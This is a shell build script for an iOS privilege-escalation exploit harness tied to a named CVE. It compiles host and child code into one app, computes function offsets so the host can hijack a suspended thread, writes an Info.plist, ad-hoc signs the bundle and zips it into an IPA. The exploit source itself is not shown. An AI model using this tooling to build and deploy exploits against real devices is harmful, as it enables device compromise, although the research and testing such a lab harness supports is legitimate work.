#!/bin/sh
# build-ios.sh - build the CVE-2026-43724 (DirtySlide/Rie) first-mapper harness for iOS arm64/arm64e.
# Produces dist/Payload/LPE.app/{LPE (host+child in one image), Info.plist} -> zip to an IPA.
set -e

SDK=$(xcrun --sdk iphoneos --show-sdk-path)
ARCH=arm64
DIST=dist
APP="$DIST/Payload/LPE.app"

# child's main() must not collide with host's main(); we spawn OUR OWN executable as the
# suspended/RESLIDE child, so one image carries both roles.
sed 's/^int main(void)/int child_main_unused(void)/' child.c > child_nomain.c

CC="clang -arch $ARCH -isysroot $SDK -miphoneos-version-min=16.0 -O0 -g -Wall -fno-stack-protector"

echo "[*] building combined host+child image..."
$CC -o "$APP/LPE" host.c child_nomain.c

# resolve child_probe's offset inside the image so the host can hijack the suspended thread
PROBE_ADDR=$(nm "$APP/LPE" | awk '/ _child_probe$/ {print $1}')
TEXT_VMADDR=$(otool -l "$APP/LPE" | awk '/segname __TEXT/{f=1} f&&/vmaddr/{print $2; exit}')
OFF=$(printf '0x%x' $(( 0x$PROBE_ADDR - 0x$TEXT_VMADDR )))
echo "#define PROBE_OFFSET $OFF" > probe_off.h
echo "[*] child_probe @ 0x$PROBE_ADDR, __TEXT 0x$TEXT_VMADDR => PROBE_OFFSET=$OFF"

# trigger offset (child_trigger) as well
TRIG_ADDR=$(nm "$APP/LPE" | awk '/ _child_trigger$/ {print $1}')
TRIG_OFF=$(printf '0x%x' $(( 0x$TRIG_ADDR - 0x$TEXT_VMADDR )))
echo "#define TRIGGER_OFFSET $TRIG_OFF" > trig_off.h
echo "[*] child_trigger @ 0x$TRIG_ADDR => TRIGGER_OFFSET=$TRIG_OFF"

cat > "$APP/Info.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>LPE</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>LPE</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
  <key>UISupportedInterfaceOrientations</key><array><string>UIInterfaceOrientationPortrait</string></array>
</dict>
</plist>
PLIST

# ad-hoc sign the image so the bundle is at least structurally valid; our own iloader
# pass later re-signs the whole app with the personal-team certificate.
codesign -s - --force "$APP/LPE" 2>/dev/null || true
codesign -s - --force --entitlements host.entitlements "$APP/LPE" 2>/dev/null || true

cd "$DIST"
zip -q -r -X ../LPE.ipa Payload
cd ..
echo "[+] built dist/LPE.ipa"
ls -la dist/LPE.ipa
